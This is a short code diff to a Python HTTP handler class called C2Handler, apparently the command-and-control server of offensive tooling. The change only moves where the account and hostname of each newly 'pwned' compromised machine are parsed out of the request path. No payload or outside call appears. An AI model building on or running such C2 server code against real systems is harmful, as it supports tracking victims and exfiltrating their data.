@@ -18,7 +18,10 @@ class C2Handler(BaseHTTPRequestHandler):
 
         # compromised computer request exfiltrate datas
         if self.path.startswith(CMD_REQUEST):
-            client = self.path.split(CMD_REQUEST)[1] 
+            # split client infos from GET initial request
+            client = self.path.split(CMD_REQUEST)[1]
+            client_account = client.split('@')[0]
+            client_hostname = client.split('@')[1]
             
             # client not into our pwned_dict yet
             if client not in pwned_dict.values():
@@ -26,8 +29,6 @@ class C2Handler(BaseHTTPRequestHandler):
 
                 pwned_id += 1
                 pwned_dict[pwned_id] = client
-                client_account = client.split('@')[0]
-                client_hostname = client.split('@')[1]
 
                 print(f"{client_account}@{client_hostname} has been pwned!\n")
 
